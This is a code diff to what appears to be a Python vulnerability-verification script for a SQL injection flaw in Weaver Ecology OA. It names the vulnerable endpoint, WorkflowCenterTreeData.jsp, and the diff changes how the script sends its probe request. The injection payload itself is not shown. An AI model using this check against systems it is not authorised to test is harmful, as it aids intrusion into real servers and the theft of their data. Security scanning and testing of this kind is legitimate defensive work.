@@ -8,8 +8,8 @@ description: 泛微-OA SQL注入漏洞
 import sys
 import json
 import urllib3
-import requests
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class Weaver_Ecology_Oa_Sql_BaseVerify:
     def __init__(self, url):
@@ -29,7 +29,7 @@ class Weaver_Ecology_Oa_Sql_BaseVerify:
     def run(self):
         try:
             url = self.url + "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
-            check_req = requests.post(url, headers = self.headers, data = self.data,  allow_redirects = False, verify = False, timeout = 30)
+            check_req = request.post(url, headers = self.headers, data = self.data)
             if check_req.status_code == 200:
                 json_info = json.loads(check_req.text)
                 if json_info == []:
